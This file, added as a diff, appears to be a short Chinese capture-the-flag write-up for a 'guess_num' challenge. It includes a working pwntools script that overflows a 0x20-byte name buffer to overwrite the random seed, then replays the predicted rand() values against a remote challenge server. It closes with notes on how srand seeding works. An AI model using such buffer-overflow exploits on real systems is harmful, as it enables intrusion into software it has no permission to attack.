@@ -1,0 +1,32 @@
+如果不利用srand()，可以进入程序查看比较的内容
+首先溢出0x20的字节，再存放一个64位的种子，后续的序列就已经固定
+
+from pwn import *
+#p = process("./guess_num")
+p = remote("111.198.29.45", 31630)
+p.recvuntil("Your name:")
+p.sendline("x"*0x20+p64(1))
+p.recvuntil("guess number:")
+p.sendline(str(2))
+p.recvuntil("guess number:")
+p.sendline(str(5))
+p.recvuntil("guess number:")
+p.sendline(str(4))
+p.recvuntil("guess number:")
+p.sendline(str(2))
+p.recvuntil("guess number:")
+p.sendline(str(6))
+p.recvuntil("guess number:")
+p.sendline(str(2))
+p.recvuntil("guess number:")
+p.sendline(str(5))
+p.recvuntil("guess number:")
+p.sendline(str(1))
+p.recvuntil("guess number:")
+p.sendline(str(4))
+p.recvuntil("guess number:")
+p.sendline(str(2))
+p.interactive()
+
+也可以利用libc库里的srand和rand，来计算数列。
+seed的作用：srand函数的作用是根据参数seed，设置一个随机起始点，而rand函数根据这个起始点，产生随机数序列。默认的随机种子为1.如果随机种子一样，rand函数所产生的随机序列也一样。因此,为使每次程序运行都能产生不同的随机序列，每次都应产生一个不同的种子参数。
